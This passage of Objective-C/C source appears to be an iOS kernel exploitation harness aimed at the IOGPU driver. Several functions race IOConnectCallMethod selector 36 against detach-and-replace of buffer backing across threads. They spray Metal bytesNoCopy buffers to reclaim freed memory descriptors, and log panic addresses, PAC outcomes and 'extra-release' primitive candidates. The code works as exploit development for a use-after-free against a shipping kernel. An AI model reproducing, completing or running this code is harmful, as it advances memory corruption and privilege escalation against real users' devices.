        p011_log("p014 [calib] sel36 -> 0x%08x %s sout=0x%llx nout=%u",
                 (unsigned)kr, p011_kr(kr), (unsigned long long)out, nout);
        fcntl(p011_fd, F_FULLFSYNC);
    }

    p014_arg a, b;

    a = base; a.do_sel36 = 1; a.do_repl = 0;
    p014_run_phase("A-only-sel36", &a, NULL, P014_SEC);

    b = base; b.do_sel36 = 0; b.do_repl = 1;
    p014_run_phase("B-only-replace", &b, NULL, P014_SEC);

    a = base; a.do_sel36 = 1; a.do_repl = 0;
    b = base; b.do_sel36 = 0; b.do_repl = 1;
    p014_run_phase("concurrent-A36-Brepl", &a, &b, P014_SEC);

    a = base; a.do_sel36 = 0; a.do_repl = 1;
    b = base; b.do_sel36 = 1; b.do_repl = 0;
    p014_run_phase("swap-Arepl-B36", &a, &b, P014_SEC);

    a = base; a.do_sel36 = 1; a.do_repl = 1;
    p014_run_phase("interleaved-same-thread", &a, NULL, P014_SEC);

    p011_log("p014 verdict: SURVIVED all 5x%ds phases. See histograms. Panic would have no verdict.",
             P014_SEC);
    vm_deallocate(mach_task_self(), p0, Ls);
    vm_deallocate(mach_task_self(), p1, Ls);
    (void)buf;
    (void)pg;
    return p011_finish();
}

#define P014B_RING 48

static void *p014_spray_worker(void *u) {
    p014_arg *a = (p014_arg *)u;
    id ring[P014B_RING];
    vm_address_t pgs[P014B_RING];
    memset(ring, 0, sizeof(ring));
    memset(pgs, 0, sizeof(pgs));
    int slot = 0;
    const vm_size_t Ls = 0x4000;
    while (!atomic_load(a->stop)) {
        @autoreleasepool {
            vm_address_t pg = 0;
            if (vm_allocate(mach_task_self(), &pg, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg) {
                atomic_fetch_add(a->spray_fail, 1);
                continue;
            }
            memset((void *)(uintptr_t)pg, 0xEE, (size_t)Ls);
            id b = [a->spray_dev newBufferWithBytesNoCopy:(void *)(uintptr_t)pg
                                                   length:(NSUInteger)Ls
                                                  options:MTLResourceStorageModeShared
                                              deallocator:^(void *ptr, NSUInteger n) {
                                                  (void)ptr; (void)n;
                                              }];
            void *r = b ? p011_ref(b) : NULL;
            uint32_t t = (r && a->getType) ? a->getType(r) : 0;
            if (!b || !r || t != 0x80) {
                if (b) b = nil;
                vm_deallocate(mach_task_self(), pg, Ls);
                atomic_fetch_add(a->spray_fail, 1);
                continue;
            }
            if (ring[slot]) {
                ring[slot] = nil;
                if (pgs[slot])
                    vm_deallocate(mach_task_self(), pgs[slot], Ls);
            }
            ring[slot] = b;
            pgs[slot] = pg;
            slot = (slot + 1) % P014B_RING;
            atomic_fetch_add(a->spray_ok, 1);
            atomic_fetch_add(a->iters, 1);
        }
    }
    for (int i = 0; i < P014B_RING; i++) {
        if (ring[i]) ring[i] = nil;
        if (pgs[i]) vm_deallocate(mach_task_self(), pgs[i], Ls);
    }
    return NULL;
}

+ (NSString *)runSel36ReplaceRaceShifted {
    p011_buf = [NSMutableString string];
    g_surf = NULL;
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p014b_ane_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p011_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    p011_log("=== p014b: shifted-window sel36 vs replace + type-0x80 spray ===");
    p011_log("[*] same setup as p014ane (0x80 bytesNoCopy 0x4000, Device conn).");
    p011_log("[*] sel36 scalars {id, 0, 0x1000} (len 4096, not 8).");
    p011_log("[*] A=sel36  B=detach+replace  C=bytesNoCopy 0x80 spray ring=%d.", P014B_RING);
    p011_log("[*] 10s. Panic PC is the dataset:");
    p011_log("[*]   PC in 0x986xxxx / 0x985fxxxx (static) = free landed MID-WINDOW. Paste ips.");
    p011_log("[*]   PC at 5c9564 again = still early; bump length to 0x10000.");
    p011_log("[*]   SURVIVED + sout outside calib set = reclaim consumed; every distinct sout logged.");
    p011_log("[*] Not KRW.");
    fcntl(p011_fd, F_FULLFSYNC);

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iogpu) { p011_log("p014b [0] STOP dlopen IOGPU"); return p011_finish(); }

    g_detach = (P011Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_repl   = (P011Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P011GetType_t getType = (P011GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    p011_getconn_t devConn = (p011_getconn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    p011_iocall_t iocall = iokit ? (p011_iocall_t)dlsym(iokit, "IOConnectCallMethod") : NULL;
    if (!g_detach || !g_repl || !iocall) {
        p011_log("p014b [0] STOP syms detach=%p repl=%p iocall=%p", g_detach, g_repl, iocall);
        return p011_finish();
    }

    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) { p011_log("p014b [0] STOP no device"); return p011_finish(); }
    g_q = [g_dev newCommandQueue];
    if (!g_q) { p011_log("p014b [0] STOP no queue"); return p011_finish(); }

    id mtlDev = p011_unwrap(g_dev);
    void *devRef = p011_strip(p011_ivar(mtlDev, "_deviceRef"));
    uint32_t dconn = 0;
    if (p011_is_heap(devRef) && devConn)
        dconn = devConn(devRef);

    const vm_size_t Ls = 0x4000;
    vm_address_t pg = 0;
    if (vm_allocate(mach_task_self(), &pg, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg) {
        p011_log("p014b [0] STOP vm_allocate main");
        return p011_finish();
    }
    memset((void *)pg, 0x41, (size_t)Ls);
    id<MTLBuffer> buf = [g_dev newBufferWithBytesNoCopy:(void *)pg
                                                 length:(NSUInteger)Ls
                                                options:MTLResourceStorageModeShared
                                            deallocator:^(void *ptr, NSUInteger n) {
                                                (void)ptr; (void)n;
                                            }];
    void *ref = buf ? p011_ref(buf) : NULL;
    uint32_t typ = (ref && getType) ? getType(ref) : 0;
    p011_log("p014b [0] bytesNoCopy 0x%lx type=0x%x buf=%p ref=%p",
             (unsigned long)Ls, typ, buf, ref);
    if (!buf || !ref || typ != 0x80) {
        p011_log("p014b [0] STOP no type 0x80");
        vm_deallocate(mach_task_self(), pg, Ls);
        return p011_finish();
    }
    uint32_t rid = p011_res_id(ref);
    uint32_t rconn = p011_res_conn(ref);
    uint32_t conn = dconn ? dconn : rconn;
    p011_dump_res("p014b [0]", ref);
    p011_log("p014b [0] id=%u (lab id 17 is whatever the kernel assigned) res_conn=%u dconn=%u using_conn=%u",
             rid, rconn, dconn, conn);
    if (!conn || !rid) {
        p011_log("p014b [0] STOP conn=%u id=%u", conn, rid);
        return p011_finish();
    }
    fcntl(p011_fd, F_FULLFSYNC);

    vm_address_t p0 = 0, p1 = 0;
    if (vm_allocate(mach_task_self(), &p0, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !p0 ||
        vm_allocate(mach_task_self(), &p1, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !p1) {
        p011_log("p014b [0] STOP replace-page alloc");
        return p011_finish();
    }
    memset((void *)p0, 0x43, (size_t)Ls);
    memset((void *)p1, 0x45, (size_t)Ls);

    const uint64_t slen = 0x1000;
    p011_log("p014b [calib] sel36 {id=%u,0,0x%llx} — if last line, died on first sel36",
             rid, (unsigned long long)slen);
    fcntl(p011_fd, F_FULLFSYNC);
    uint64_t calib_out = (uint64_t)-1;
    unsigned calib_kr = 0;
    {
        uint64_t in[3] = { rid, 0, slen };
        uint64_t out = 0;
        uint32_t nout = 1;
        kern_return_t kr = iocall(conn, 36, in, 3, NULL, 0, &out, &nout, NULL, NULL);
        calib_kr = (unsigned)kr;
        calib_out = (kr == 0) ? out : (uint64_t)-1;
        p011_log("p014b [calib] sel36 -> 0x%08x %s sout=0x%llx nout=%u",
                 (unsigned)kr, p011_kr(kr), (unsigned long long)out, nout);
        fcntl(p011_fd, F_FULLFSYNC);
    }

    p014_arg a, b, c;
    memset(&a, 0, sizeof(a));
    a.ref = ref;
    a.detach = g_detach;
    a.repl = g_repl;
    a.iocall = iocall;
    a.conn = conn;
    a.id = rid;
    a.sel_len = slen;
    a.pages[0] = (void *)p0;
    a.pages[1] = (void *)p1;
    a.plen = (size_t)Ls;
    a.spray_dev = g_dev;
    a.getType = getType;
    b = a;
    c = a;
    a.do_sel36 = 1;
    a.do_repl = 0;
    b.do_sel36 = 0;
    b.do_repl = 1;
    c.do_sel36 = 0;
    c.do_repl = 0;

    atomic_int stop = 0;
    atomic_ullong ia = 0, ib = 0, ic = 0, sok = 0, sfail = 0;
    p014_kh kh[P014_HIST];
    p014_oh oh[P014_HIST];
    uint64_t det_fail = 0, rep_ok = 0, rep_fail = 0;
    memset(kh, 0, sizeof(kh));
    memset(oh, 0, sizeof(oh));
    a.stop = b.stop = c.stop = &stop;
    a.iters = &ia;
    b.iters = &ib;
    c.iters = &ic;
    a.kh = b.kh = c.kh = kh;
    a.oh = b.oh = c.oh = oh;
    a.det_fail = b.det_fail = c.det_fail = &det_fail;
    a.rep_ok = b.rep_ok = c.rep_ok = &rep_ok;
    a.rep_fail = b.rep_fail = c.rep_fail = &rep_fail;
    c.spray_ok = &sok;
    c.spray_fail = &sfail;

    p011_log("p014b [run] START 10s A=sel36(len=0x1000) B=replace C=spray — if this is last line, died in window");
    fcntl(p011_fd, F_FULLFSYNC);

    pthread_t ta, tb, tc;
    if (pthread_create(&ta, NULL, p014_worker, &a) != 0) {
        p011_log("p014b [run] STOP pthread A");
        return p011_finish();
    }
    if (pthread_create(&tb, NULL, p014_worker, &b) != 0) {
        atomic_store(&stop, 1);
        pthread_join(ta, NULL);
        p011_log("p014b [run] STOP pthread B");
        return p011_finish();
    }
    if (pthread_create(&tc, NULL, p014_spray_worker, &c) != 0) {
        atomic_store(&stop, 1);
        pthread_join(ta, NULL);
        pthread_join(tb, NULL);
        p011_log("p014b [run] STOP pthread C");
        return p011_finish();
    }
    usleep((useconds_t)P014_SEC * 1000000u);
    atomic_store(&stop, 1);
    pthread_join(ta, NULL);
    pthread_join(tb, NULL);
    pthread_join(tc, NULL);

    p014_dump_hist("p014b", atomic_load(&ia), atomic_load(&ib),
                   kh, oh, det_fail, rep_ok, rep_fail, calib_out);
    p011_log("p014b [run] spray_ok=%llu spray_fail=%llu spray_iters=%llu calib_kr=0x%x calib_sout=0x%llx",
             (unsigned long long)atomic_load(&sok),
             (unsigned long long)atomic_load(&sfail),
             (unsigned long long)atomic_load(&ic),
             calib_kr, (unsigned long long)calib_out);
    int outside = 0;
    for (int i = 0; i < P014_HIST && oh[i].n; i++) {
        int odd = (calib_out != (uint64_t)-1 && oh[i].v != calib_out);
        if (odd) outside = 1;
        p011_log("p014b [sout] 0x%llx n=%llu%s",
                 (unsigned long long)oh[i].v, (unsigned long long)oh[i].n,
                 odd ? " OUTSIDE-CALIB" : "");
    }
    if (outside)
        p011_log("p014b verdict: SURVIVED 10s; sout outside calib set — reclaim consumed. Distinct sout above.");
    else
        p011_log("p014b verdict: SURVIVED 10s; sout stayed in calib set (or no success). Panic would have no verdict.");
    fcntl(p011_fd, F_FULLFSYNC);

    vm_deallocate(mach_task_self(), p0, Ls);
    vm_deallocate(mach_task_self(), p1, Ls);
    (void)buf;
    (void)pg;
    return p011_finish();
}

+ (NSString *)runP015ExtraRelease {
    p011_buf = [NSMutableString string];
    g_surf = NULL;
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p015_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p011_fd = open(path.fileSystemRepresentation, O_WRONLY | O_CREAT | O_TRUNC, 0644);

    p011_log("=== p015: ordered extra-release (NOT concurrent) ===");
    p011_log("[*] A14 23F77. sel36 {id,0,0x1000} then detach+replace then keep-alive 0x80 spray then sel36.");
    p011_log("[*] Step5 sel36 on spray ids. First 2c2/crash = extra-release hit. STOP. Do not touch that buffer.");
    p011_log("[*] Panic PC 0x9857cc8 = slot empty. 0x9857cd8 = retain MD2. 0x9857d00 = PAC passed on release.");
    p011_log("[*] Not KRW.");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iogpu) { p011_log("p015 STOP dlopen IOGPU"); return p011_finish(); }
    g_detach = (P011Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_repl   = (P011Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P011GetType_t getType = (P011GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    p011_getconn_t devConn = (p011_getconn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    p011_iocall_t iocall = iokit ? (p011_iocall_t)dlsym(iokit, "IOConnectCallMethod") : NULL;
    if (!g_detach || !g_repl || !iocall || !getType) {
        p011_log("p015 STOP syms detach=%p repl=%p iocall=%p getType=%p", g_detach, g_repl, iocall, getType);
        return p011_finish();
    }
    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) { p011_log("p015 STOP no device"); return p011_finish(); }
    g_q = [g_dev newCommandQueue];
    if (!g_q) { p011_log("p015 STOP no queue"); return p011_finish(); }
    void *devRef = p011_ivar(g_dev, "_deviceRef");
    uint32_t dconn = (devConn && p011_is_heap(devRef)) ? devConn(devRef) : 0;
    p011_log("p015 [0] metal=%s dconn=%u", [[g_dev name] UTF8String], dconn);

    const vm_size_t Ls = 0x4000;
    const uint64_t slen = 0x1000;
    static const int kNs[] = { 16, 64, 256 };
    int died = 0;

    for (int ni = 0; ni < 3 && !died; ni++) {
        int N = kNs[ni];
        p011_log("p015 [N] ===== N=%d =====", N);
        fcntl(p011_fd, F_FULLFSYNC);

        vm_address_t pg = 0, pr = 0;
        if (vm_allocate(mach_task_self(), &pg, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg) {
            p011_log("p015 [N=%d] STOP vm_allocate main", N);
            break;
        }
        memset((void *)pg, 0x41, (size_t)Ls);
        id buf = [g_dev newBufferWithBytesNoCopy:(void *)pg length:Ls
                                         options:MTLResourceStorageModeShared
                                     deallocator:^(void *p, NSUInteger n) { (void)p; (void)n; }];
        void *ref = buf ? p011_ref(buf) : NULL;
        uint32_t typ = (ref && getType) ? getType(ref) : 0;
        p011_log("p015 [N=%d] bytesNoCopy type=0x%x buf=%p ref=%p", N, typ, buf, ref);
        if (!buf || !ref || typ != 0x80) {
            p011_log("p015 [N=%d] STOP no type 0x80", N);
            vm_deallocate(mach_task_self(), pg, Ls);
            break;
        }
        uint32_t rid = p011_res_id(ref);
        uint32_t rconn = p011_res_conn(ref);
        uint32_t conn = dconn ? dconn : rconn;
        p011_dump_res("p015 [0]", ref);
        p011_log("p015 [N=%d] id=%u conn=%u", N, rid, conn);
        if (!conn || !rid) {
            p011_log("p015 [N=%d] STOP conn/id", N);
            vm_deallocate(mach_task_self(), pg, Ls);
            break;
        }
        if (vm_allocate(mach_task_self(), &pr, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pr) {
            p011_log("p015 [N=%d] STOP replace page", N);
            vm_deallocate(mach_task_self(), pg, Ls);
            break;
        }
        memset((void *)pr, 0x43, (size_t)Ls);

        uint64_t in[3] = { rid, 0, slen };
        uint64_t out = 0;
        uint32_t nout = 1;
        p011_log("p015 [calib] sel36 {id=%u,0,0x%llx} — if last line, died on first sel36", rid, slen);
        fcntl(p011_fd, F_FULLFSYNC);
        kern_return_t kr = iocall(conn, 36, in, 3, NULL, 0, &out, &nout, NULL, NULL);
        p011_log("p015 [calib] sel36 -> 0x%08x %s sout=0x%llx nout=%u",
                 (unsigned)kr, p011_kr(kr), (unsigned long long)out, nout);
        fcntl(p011_fd, F_FULLFSYNC);
        if (kr != 0) {
            p011_log("p015 [N=%d] STOP calib not SUCCESS — not 0x80/len or sel36 2c2", N);
            vm_deallocate(mach_task_self(), pg, Ls);
            vm_deallocate(mach_task_self(), pr, Ls);
            break;
        }

        /* Second sel36 is net-zero retain on the same MD; still leaves MD1 at +0x30. */
        out = 0; nout = 1;
        p011_log("p015 [step1] sel36 install — if last line, died on taggedRetain(MD1)");
        fcntl(p011_fd, F_FULLFSYNC);
        kr = iocall(conn, 36, in, 3, NULL, 0, &out, &nout, NULL, NULL);
        p011_log("p015 [step1] sel36 SUCCESS sout=0x%llx (MD1 installed) kr=0x%08x %s",
                 (unsigned long long)out, (unsigned)kr, p011_kr(kr));
        fcntl(p011_fd, F_FULLFSYNC);
        if (kr != 0) {
            p011_log("p015 [N=%d] STOP step1 not SUCCESS", N);
            vm_deallocate(mach_task_self(), pg, Ls);
            vm_deallocate(mach_task_self(), pr, Ls);
            break;
        }

        p011_log("p015 [step2] detach+replace — if last line, died in replace (MD1 free)");
        fcntl(p011_fd, F_FULLFSYNC);
        int dkr = g_detach(ref);
        int rkr = (dkr == 0) ? g_repl(ref, (void *)pr, Ls) : -1;
        p011_log("p015 [step2] detach=0x%08x %s replace=0x%08x %s (MD1 freed if both 0)",
                 (unsigned)dkr, p011_kr(dkr), (unsigned)rkr, p011_kr((kern_return_t)rkr));
        fcntl(p011_fd, F_FULLFSYNC);
        if (dkr != 0 || rkr != 0) {
            p011_log("p015 [N=%d] STOP step2 detach/replace failed", N);
            vm_deallocate(mach_task_self(), pg, Ls);
            vm_deallocate(mach_task_self(), pr, Ls);
            break;
        }

        NSMutableArray *ring = [NSMutableArray arrayWithCapacity:(NSUInteger)N];
        vm_address_t *pgs = (vm_address_t *)calloc((size_t)N, sizeof(vm_address_t));
        uint32_t *ids = (uint32_t *)calloc((size_t)N, sizeof(uint32_t));
        int created = 0;
        if (!pgs || !ids) {
            p011_log("p015 [step3] STOP calloc");
            free(pgs); free(ids);
            break;
        }
        p011_log("p015 [step3] spray N=%d KEEP ALL ALIVE — if last line, died in spray create", N);
        fcntl(p011_fd, F_FULLFSYNC);
        for (int i = 0; i < N; i++) {
            vm_address_t sp = 0;
            if (vm_allocate(mach_task_self(), &sp, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !sp)
                continue;
            memset((void *)sp, 0xEE, (size_t)Ls);
            id b = [g_dev newBufferWithBytesNoCopy:(void *)(uintptr_t)sp length:Ls
                                           options:MTLResourceStorageModeShared
                                       deallocator:^(void *p, NSUInteger n) { (void)p; (void)n; }];
            void *r = b ? p011_ref(b) : NULL;
            uint32_t t = (r && getType) ? getType(r) : 0;
            if (!b || !r || t != 0x80) {
                if (b) b = nil;
                vm_deallocate(mach_task_self(), sp, Ls);
                continue;
            }
            [ring addObject:b];
            pgs[created] = sp;
            ids[created] = p011_res_id(r);
            created++;
        }
        {
            char idbuf[768];
            int off = 0;
            off += snprintf(idbuf + off, sizeof(idbuf) - (size_t)off, "p015 [step3] spray N=%d created=%d ids=[", N, created);
            for (int i = 0; i < created && off < (int)sizeof(idbuf) - 16; i++)
                off += snprintf(idbuf + off, sizeof(idbuf) - (size_t)off, "%s%u", i ? "," : "", ids[i]);
            snprintf(idbuf + off, sizeof(idbuf) - (size_t)off, "]");
            p011_log("%s", idbuf);
        }
        fcntl(p011_fd, F_FULLFSYNC);
        if (created == 0) {
            p011_log("p015 [N=%d] STOP spray created 0", N);
            free(pgs); free(ids);
            vm_deallocate(mach_task_self(), pg, Ls);
            vm_deallocate(mach_task_self(), pr, Ls);
            break;
        }

        out = 0; nout = 1;
        p011_log("p015 [step4] sel36 trigger — if last line, died in taggedRetain(MD2)/taggedRelease(MD1)");
        fcntl(p011_fd, F_FULLFSYNC);
        kr = iocall(conn, 36, in, 3, NULL, 0, &out, &nout, NULL, NULL);
        p011_log("p015 [step4] sel36 -> 0x%08x %s sout=0x%llx (taggedRelease ran if SUCCESS)",
                 (unsigned)kr, p011_kr(kr), (unsigned long long)out);
        fcntl(p011_fd, F_FULLFSYNC);

        int hit = -1;
        unsigned hitkr = 0;
        p011_log("p015 [step5] checking %d spray buffers sel36 {id,0,8}", created);
        fcntl(p011_fd, F_FULLFSYNC);
        for (int i = 0; i < created; i++) {
            uint64_t sin[3] = { ids[i], 0, 8 };
            uint64_t sout = 0;
            uint32_t nso = 1;
            p011_log("p015 [step5] spray[%d] id=%u sel36 — if last line, died on this IOMD", i, ids[i]);
            fcntl(p011_fd, F_FULLFSYNC);
            kern_return_t skr = iocall(conn, 36, sin, 3, NULL, 0, &sout, &nso, NULL, NULL);
            p011_log("p015 [step5] spray[%d] sel36 -> 0x%08x %s sout=0x%llx",
                     i, (unsigned)skr, p011_kr(skr), (unsigned long long)sout);
            fcntl(p011_fd, F_FULLFSYNC);
            if (skr == (kern_return_t)0xe00002c2 || skr != 0) {
                hit = i;
                hitkr = (unsigned)skr;
                p011_log("p015 [step5] STOP spray[%d] id=%u died kr=0x%08x — extra-release candidate. Do not touch.",
                         i, ids[i], hitkr);
                died = 1;
                break;
            }
        }

        if (died) {
            p011_log("p015 verdict: spray buffer %d id=%u died kr=0x%08x. Primitive candidate. STOP. Do not reuse that IOMD.",
                     hit, ids[hit], hitkr);
            fcntl(p011_fd, F_FULLFSYNC);
            /* keep spray buffers alive; do not deallocate their pages */
            (void)ring;
            (void)pgs;
            free(ids);
            break;
        }

        if (kr == 0)
            p011_log("p015 [N=%d] step4 SUCCESS, no spray died. taggedRelease ran on a live IOMD or on freed-unoccupied.", N);
        else
            p011_log("p015 [N=%d] step4 kr=0x%08x %s, no spray died.", N, (unsigned)kr, p011_kr(kr));

        [ring removeAllObjects];
        for (int i = 0; i < created; i++) {
            if (pgs[i]) vm_deallocate(mach_task_self(), pgs[i], Ls);
        }
        free(pgs); free(ids);
        buf = nil;
        vm_deallocate(mach_task_self(), pg, Ls);
        vm_deallocate(mach_task_self(), pr, Ls);
    }

    if (!died)
        p011_log("p015 verdict: SURVIVED N=16/64/256. No spray 2c2. PAC-fail would have no verdict. Reclaim not observed this run.");
    fcntl(p011_fd, F_FULLFSYNC);
    return p011_finish();
}

#define P017_RING 256
#define P017_SEC  30
#define P017_SPRAY_LEN 0x400

static void p017_pin(int tag) {
    thread_affinity_policy_data_t pol;
    pol.affinity_tag = tag;
    (void)thread_policy_set(pthread_mach_thread_np(pthread_self()),
                            THREAD_AFFINITY_POLICY,
                            (thread_policy_t)&pol,
                            THREAD_AFFINITY_POLICY_COUNT);
}

typedef struct {
    void *ref;
    P011Detach_t detach;
    P011Replace_t repl;
    p011_iocall_t iocall;
    mach_port_t conn;
    uint32_t id;
    uint64_t sel_len;
    void *repl_page;
    size_t repl_len;
    __unsafe_unretained id spray_dev;
    P011GetType_t getType;
    atomic_int *stop;
    atomic_ullong *itersA;
    atomic_ullong *itersB;
    atomic_ullong *spray_ok;
    atomic_ullong *spray_fail;
    p014_kh *kh;
    p014_oh *oh;
    atomic_ullong *det_fail;
    atomic_ullong *rep_fail;
    atomic_ullong *rep_ok;
    uint32_t *live_ids;
    atomic_int *live_n;
} p017_arg;

static void *p017_thr_a(void *u) {
    p017_arg *a = (p017_arg *)u;
    p017_pin(1);
    uint64_t in[3] = { a->id, 0, a->sel_len };
    while (!atomic_load(a->stop)) {
        uint64_t out = 0;
        uint32_t nout = 1;
        kern_return_t kr = a->iocall(a->conn, 36, in, 3, NULL, 0, &out, &nout, NULL, NULL);
        p014_hist_kr(a->kh, (unsigned)kr);
        if (kr == 0)
            p014_hist_out(a->oh, out);
        atomic_fetch_add(a->itersA, 1);
    }
    return NULL;
}

static void *p017_thr_b(void *u) {
    p017_arg *a = (p017_arg *)u;
    p017_pin(2);
    NSMutableArray *ring = [NSMutableArray arrayWithCapacity:P017_RING];
    vm_address_t pgs[P017_RING];
    uint32_t ids[P017_RING];
    memset(pgs, 0, sizeof(pgs));
    memset(ids, 0, sizeof(ids));
    int slot = 0;
    const vm_size_t alloc_sz = 0x4000;
    while (!atomic_load(a->stop)) {
        @autoreleasepool {
            int dkr = a->detach(a->ref);
            if (dkr != 0) {
                atomic_fetch_add(a->det_fail, 1);
                continue;
            }
            int rkr = a->repl(a->ref, a->repl_page, a->repl_len);
            if (rkr != 0) {
                atomic_fetch_add(a->rep_fail, 1);
                continue;
            }
            atomic_fetch_add(a->rep_ok, 1);

            vm_address_t pg = 0;
            if (vm_allocate(mach_task_self(), &pg, alloc_sz, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg) {
                atomic_fetch_add(a->spray_fail, 1);
                atomic_fetch_add(a->itersB, 1);
                continue;
            }
            memset((void *)(uintptr_t)pg, 0xEE, P017_SPRAY_LEN);
            id b = [a->spray_dev newBufferWithBytesNoCopy:(void *)(uintptr_t)pg
                                                   length:(NSUInteger)P017_SPRAY_LEN
                                                  options:MTLResourceStorageModeShared
                                              deallocator:^(void *p, NSUInteger n) { (void)p; (void)n; }];
            void *r = b ? p011_ref(b) : NULL;
            uint32_t t = (r && a->getType) ? a->getType(r) : 0;
            if (!b || !r || t != 0x80) {
                if (b) b = nil;
                vm_deallocate(mach_task_self(), pg, alloc_sz);
                atomic_fetch_add(a->spray_fail, 1);
                atomic_fetch_add(a->itersB, 1);
                continue;
            }
            if ((int)ring.count == P017_RING) {
                [ring replaceObjectAtIndex:(NSUInteger)slot withObject:b];
                if (pgs[slot])
                    vm_deallocate(mach_task_self(), pgs[slot], alloc_sz);
            } else {
                [ring addObject:b];
            }
            pgs[slot] = pg;
            ids[slot] = p011_res_id(r);
            slot = (slot + 1) % P017_RING;
            atomic_fetch_add(a->spray_ok, 1);
            atomic_fetch_add(a->itersB, 1);
        }
    }
    int n = (int)ring.count;
    if (n > P017_RING) n = P017_RING;
    atomic_store(a->live_n, n);
    for (int i = 0; i < n; i++)
        a->live_ids[i] = ids[i];
    /* keep ring alive until phase 2 copies ids; pages stay until we return after main joins */
    (void)ring;
    return NULL;
}

+ (NSString *)runP017ConfusedDeputy {
    p011_buf = [NSMutableString string];
    g_surf = NULL;
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p017_legacy_confused_deputy_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p011_fd = open(path.fileSystemRepresentation, O_WRONLY | O_CREAT | O_TRUNC, 0644);

    p011_log("=== p017 session (legacy, not p017v2): same-core free+reclaim ===");
    p011_log("[*] A=sel36 {id,0,0x1000}  B=detach+replace(0x4000)+bytesNoCopy 0x400 ring=%d", P017_RING);
    p011_log("[*] affinity tags A=1 B=2 (hint; iOS may ignore). 30s. Not KRW.");
    p011_log("[*] Panic 0x9857cc8=missed reclaim  0x9857cd8=PAC passed retain  0x9857d00=release (unexpected).");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iogpu) { p011_log("p017 STOP dlopen IOGPU"); return p011_finish(); }
    g_detach = (P011Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_repl   = (P011Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P011GetType_t getType = (P011GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    p011_getconn_t devConn = (p011_getconn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    p011_iocall_t iocall = iokit ? (p011_iocall_t)dlsym(iokit, "IOConnectCallMethod") : NULL;
    if (!g_detach || !g_repl || !iocall || !getType) {
        p011_log("p017 STOP syms");
        return p011_finish();
    }
    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) { p011_log("p017 STOP no device"); return p011_finish(); }
    g_q = [g_dev newCommandQueue];
    if (!g_q) { p011_log("p017 STOP no queue"); return p011_finish(); }
    id mtlDev = p011_unwrap(g_dev);
    void *devRef = p011_strip(p011_ivar(mtlDev, "_deviceRef"));
    uint32_t dconn = (devConn && p011_is_heap(devRef)) ? devConn(devRef) : 0;
    p011_log("p017 [0] metal=%s dconn=%u", [[g_dev name] UTF8String], dconn);

    const vm_size_t Ls = 0x4000;
    vm_address_t pg = 0, pr = 0;
    if (vm_allocate(mach_task_self(), &pg, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg ||
        vm_allocate(mach_task_self(), &pr, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pr) {
        p011_log("p017 STOP vm_allocate");
        return p011_finish();
    }
    memset((void *)pg, 0x41, (size_t)Ls);
    memset((void *)pr, 0x43, (size_t)Ls);
    id buf = [g_dev newBufferWithBytesNoCopy:(void *)pg length:Ls
                                     options:MTLResourceStorageModeShared
                                 deallocator:^(void *p, NSUInteger n) { (void)p; (void)n; }];
    void *ref = buf ? p011_ref(buf) : NULL;
    uint32_t typ = (ref && getType) ? getType(ref) : 0;
    p011_log("p017 [0] bytesNoCopy 0x%lx type=0x%x ref=%p", (unsigned long)Ls, typ, ref);
    if (!buf || !ref || typ != 0x80) {
        p011_log("p017 STOP no type 0x80");
        return p011_finish();
    }
    uint32_t rid = p011_res_id(ref);
    uint32_t rconn = p011_res_conn(ref);
